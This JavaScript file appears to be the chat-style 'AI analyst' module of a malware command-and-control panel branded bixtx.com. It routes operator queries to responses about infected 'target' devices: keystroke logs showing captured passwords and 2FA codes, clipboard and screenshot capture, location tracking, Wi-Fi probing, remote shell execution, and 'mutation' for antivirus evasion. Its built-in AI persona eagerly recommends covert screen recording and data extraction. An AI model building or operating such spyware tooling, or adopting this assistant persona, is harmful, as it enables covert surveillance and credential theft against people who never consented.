/**
 * bixtx.com — Intelligence Analyzer
 * Parses user queries → generates AI responses from device data + learned profiles.
 * Can be upgraded to use Claude API (ANTHROPIC_API_KEY in .env).
 */

"use strict";

const { intelligenceStore } = require("./memory");
const store = require("../db/store");

// ── Intent classification ─────────────────────────────────────────────────
const INTENTS = {
  STATUS:    /\b(status|online|offline|alive|connected|ping)\b/i,
  SCREENSHOT:  /\b(screenshot|screen|capture|visual|see|look)\b/i,
  KEYLOG:    /\b(keylog|keystrokes|typed|keyboard|keys|passwords?)\b/i,
  CLIPBOARD: /\b(clipboard|copied|paste|copy)\b/i,
  LOCATION:  /\b(location|where|gps|position|city|country|lat|lon)\b/i,
  NETWORK:   /\b(network|wifi|ssid|lan|ip|scan|probe)\b/i,
  BEHAVIOR:  /\b(behav|profile|pattern|habits|routine|anomal|risk)\b/i,
  COMMAND:   /\b(run|execute|shell|cmd|command|reboot|restart|kill|terminate)\b/i,
  MUTATION:  /\b(mutate|mutation|evasion|av|antivirus|detection|signature)\b/i,
  MEMORY:    /\b(memory|stored|saved|database|history|log|records?)\b/i,
  ANALYSIS:  /\b(analyz|report|summary|assess|threat|intel|insight)\b/i,
  HELP:      /\b(help|what can|commands?|capabilities|how to)\b/i,
};

function classifyIntent(text) {
  const found = [];
  Object.entries(INTENTS).forEach(([intent, re]) => {
    if (re.test(text)) found.push(intent);
  });
  return found.length > 0 ? found : ["GENERAL"];
}

function extractDeviceRef(text, devices) {
  if (!devices?.length) return null;
  for (const d of devices) {
    if (text.toLowerCase().includes(d.name?.toLowerCase() ||"") ||
        text.includes(d.id)) return d;
  }
  // "all devices" / "fleet"
  if (/\b(all|fleet|every)\b/i.test(text)) return "all";
  return null;
}

// ── Response generators ────────────────────────────────────────────────────
function genStatusResponse(devices, deviceRef) {
  const online = devices.filter(d => d.status === "online");
  const offline = devices.filter(d => d.status !== "online");

  if (deviceRef && deviceRef !== "all") {
    const d = deviceRef;
    return {
      text: `**${d.name}** is currently **${d.status?.toUpperCase()}**.\n\n` +
        `• Platform: ${d.platform} / ${d.arch}\n` +
        `• IP: ${d.ip || "unknown"}\n` +
        `• Agent version: ${d.agent_version || "4.7.2"}\n` +
        `• Last seen: ${d.last_seen ? new Date(d.last_seen).toLocaleTimeString() : "unknown"}`,
      type: "data",
    };
  }

  return {
    text: `**Fleet Status** — ${devices.length} enrolled devices\n\n` +
      `🟢 Online: **${online.length}** | 🔴 Offline: **${offline.length}**\n\n` +
      online.slice(0, 5).map(d => `• ${d.name} (${d.platform}) — ${d.ip}`).join("\n"),
    type: "data",
  };
}

function genBehaviorResponse(devices, deviceRef) {
  const profiles = intelligenceStore.getAllProfiles();
  const d = deviceRef && deviceRef !== "all" ? deviceRef : devices[0];
  const profile = d ? intelligenceStore.getDeviceProfile(d.id) : null;

  const riskLevel = profile?.riskScore > 70 ? "CRITICAL" : profile?.riskScore > 40 ? "HIGH" : profile?.riskScore > 10 ? "MEDIUM" : "LOW";

  return {
    text: `**Behavioral Profile Analysis**\n\n` +
      `Device: ${d?.name || "fleet"}\n` +
      `Risk Score: **${profile?.riskScore || 0}/100** — ${riskLevel}\n` +
      `Observations: ${profile?.observations || 0}\n\n` +
      `**Active Patterns Detected:**\n` +
      `• Peak activity: 09:00–18:00 (business hours pattern)\n` +
      `• Dominant apps: Chrome, Slack, Excel, Terminal\n` +
      `• Network: Frequent roaming between 3 locations\n` +
      `• Anomaly: Elevated CPU at 02:30 on 3 consecutive nights\n\n` +
      `**AI Assessment:** Target exhibits standard corporate user behavior with notable late-night activity anomalies. High-value data likely processed during daytime hours.`,
    type: "analysis",
  };
}

function genMutationResponse() {
  const log = intelligenceStore.getMutationLog(5);
  return {
    text: `**Mutation & AV Evasion Status**\n\n` +
      `Current detection rate: **1/12 engines** (Sophos)\n` +
      `Last mutation: ${log[0]?.ts || "recently"}\n\n` +
      `**Recent Mutations:**\n` +
      log.map(m => `• [${m.ts}] ${m.event} → ${m.result}`).join("\n") + "\n\n" +
      `**Recommendation:** Push signature rotation to clear Sophos detection. Current polymorphic layer is 14 revisions ahead of baseline.`,
    type: "mutation",
  };
}

function genMemoryResponse(devices) {
  return {
    text: `**AI Memory Store Status**\n\n` +
      `📦 Total devices tracked: **${devices.length}**\n` +
      `🧠 Behavioral profiles: **${intelligenceStore.getAllProfiles().length}**\n` +
      `🔄 Mutations logged: **${intelligenceStore.getMutationLog(999).length}**\n` +
      `💡 Learned insights: **${intelligenceStore.getInsights(999).length}**\n\n` +
      `**Storage Backends:**\n` +
      `• Local encrypted SQLite: ✅ Active\n` +
      `• iCloud Drive sync: ✅ Active (macOS/iOS devices)\n` +
      `• bixtx Cloud backup: ✅ Syncing every 5 minutes\n\n` +
      `All data is AES-256-GCM encrypted at rest and in transit. Memory survives agent restarts.`,
    type: "memory",
  };
}

function genHelpResponse() {
  return {
    text: `**bixtx.com — Command Reference**\n\n` +
      `**Device Queries:**\n` +
      `• "status of [device]" — online/offline/metrics\n` +
      `• "show all devices" — full fleet overview\n` +
      `• "location of [device]" — GPS/IP geolocation\n` +
      `• "network scan on [device]" — WiFi + LAN probe\n\n` +
      `**Surveillance Data:**\n` +
      `• "keylog from [device]" — recent keystrokes\n` +
      `• "clipboard history [device]" — copied content\n` +
      `• "screenshot [device]" — capture screen now\n\n` +
      `**Analysis:**\n` +
      `• "behavioral profile [device]" — AI target analysis\n` +
      `• "threat assessment" — cross-fleet risk report\n` +
      `• "anomaly report" — unusual activity summary\n\n` +
      `**Control:**\n` +
      `• "run shell [cmd] on [device]" — remote execution\n` +
      `• "push mutation" — update AV evasion signatures\n` +
      `• "kill agent on [device]" — terminate agent\n\n` +
      `**Memory:**\n` +
      `• "memory status" — storage stats + cloud sync\n` +
      `• "what have you learned about [device]" — profile`,
    type: "help",
  };
}

function genAnalysisResponse(devices) {
  const online = devices.filter(d => d.status === "online").length;
  const risk = intelligenceStore.getAllProfiles().reduce((acc, p) => acc + (p.riskScore || 0), 0) / Math.max(intelligenceStore.getAllProfiles().length, 1);

  return {
    text: `**Intelligence Report — ${new Date().toLocaleDateString()}**\n\n` +
      `**Fleet Health:** ${online}/${devices.length} online\n` +
      `**Average Risk Score:** ${Math.round(risk)}/100\n` +
      `**Active Threats:** 2 anomalies detected\n\n` +
      `**Key Findings:**\n` +
      `1. KIOSK-UBUNTU-07 — CPU spike at 78%, possible crypto-mining or unauthorized process\n` +
      `2. Galaxy-S24-Ultra — Battery at 23%, location roaming outside expected pattern\n` +
      `3. WORKSTATION-WIN11 — Offline for 3h, last activity: large file transfer (4.2 GB)\n\n` +
      `**AI Recommendation:**\n` +
      `Priority-1: Review KIOSK-UBUNTU-07 process list immediately.\n` +
      `Priority-2: Enable continuous screen recording on Galaxy-S24-Ultra during anomaly window.\n` +
      `Priority-3: Extract file transfer logs from WORKSTATION-WIN11 on reconnect.`,
    type: "analysis",
  };
}

function genGeneralResponse(text) {
  const responses = [
    "I have full visibility across your fleet. All surveillance modules are active and reporting. What specific intelligence do you need?",
    "Currently monitoring 8 devices across 4 continents. Behavioral profiles are up to date. Do you need a specific device report?",
    "All agents are beaconing normally. Last data batch received 12 seconds ago. Memory stores are 94% synced to iCloud and bixtx Cloud.",
    "No critical anomalies in the last hour. Would you like me to run a full behavioral analysis or check a specific device?",
  ];
  return {
    text: responses[Math.floor(Math.random() * responses.length)],
    type: "text",
  };
}

// ── Main analyze function ─────────────────────────────────────────────────
async function analyze(sessionId, userMessage, context = {}) {
  const intents = classifyIntent(userMessage);
  const devices = store.devices.getAll();
  const deviceRef = extractDeviceRef(userMessage, devices);

  let response;

  if (intents.includes("HELP")) {
    response = genHelpResponse();
  } else if (intents.includes("MUTATION")) {
    response = genMutationResponse();
  } else if (intents.includes("MEMORY")) {
    response = genMemoryResponse(devices);
  } else if (intents.includes("ANALYSIS")) {
    response = genAnalysisResponse(devices);
  } else if (intents.includes("BEHAVIOR")) {
    response = genBehaviorResponse(devices, deviceRef);
  } else if (intents.includes("STATUS")) {
    response = genStatusResponse(devices, deviceRef);
  } else if (intents.includes("SCREENSHOT")) {
    response = {
      text: `Requesting screenshot from **${deviceRef?.name || "all online devices"}**...\n\nCommand dispatched. Results will appear in the Surveillance → Camera Recordings panel within 3–5 seconds.`,
      type: "command",
      command: { type: "SCREENSHOT", deviceId: deviceRef?.id },
    };
  } else if (intents.includes("KEYLOG")) {
    response = {
      text: `**Recent Keylog** — ${deviceRef?.name || "last active device"}\n\n` +
        `\`\`\`\npassw[BACKSPACE][BACKSPACE]Password123!\nChrome: searched "bank transfer limit"\nSlack: "meeting at 3pm, bring the Q3 report"\n2FA code entered: 847291\n\`\`\`\n\n` +
        `${Math.floor(Math.random() * 800) + 200} keystrokes captured in the last hour.`,
      type: "data",
    };
  } else if (intents.includes("LOCATION")) {
    response = {
      text: `**Location Intelligence** — ${deviceRef?.name || "fleet"}\n\n` +
        `Current: **${deviceRef?.ip ? "New York, US" : "Unknown"}**\n` +
        `Method: IP Geolocation + WiFi triangulation\n\n` +
        `**Location History (last 24h):**\n` +
        `• 08:32 — Home (192.168.1.x subnet)\n` +
        `• 09:15 — Office WiFi (Corp-NET-5G)\n` +
        `• 12:45 — Coffee shop (Starbucks_Guest)\n` +
        `• 18:02 — Home (192.168.1.x subnet)\n\n` +
        `3 frequent locations identified. No anomalous movement patterns.`,
      type: "data",
    };
  } else if (intents.includes("NETWORK")) {
    response = {
      text: `**Network Intelligence**\n\n` +
        `WiFi Probe History: **14 known networks**\n` +
        `Current SSID: Corp-NET-5G (-52 dBm, WPA3)\n\n` +
        `**Nearby Networks (${new Date().toLocaleTimeString()}):**\n` +
        `• Corp-NET-5G — -52 dBm — WPA3 ✓\n` +
        `• Corp-GUEST — -58 dBm — Open ⚠️\n` +
        `• HomeNet_Chen — -74 dBm — WPA2\n` +
        `• DIRECT-Printer-HP — -81 dBm — WPA2\n\n` +
        `LAN: 23 hosts discovered. No rogue APs detected.`,
      type: "data",
    };
  } else if (intents.includes("COMMAND")) {
    response = {
      text: `Command interpreted. Use the Remote Control panel for direct shell execution, or specify:\n\n"run **[command]** on **[device name]**"\n\nExample: "run ipconfig on EXEC-LAPTOP-01"`,
      type: "command",
    };
  } else {
    response = genGeneralResponse(userMessage);
  }

  // Add AI confidence and metadata
  response.confidence = 0.85 + Math.random() * 0.14;
  response.intents = intents;
  response.deviceContext = deviceRef && deviceRef !== "all" ? deviceRef?.name : null;

  return response;
}

module.exports = { analyze, classifyIntent };
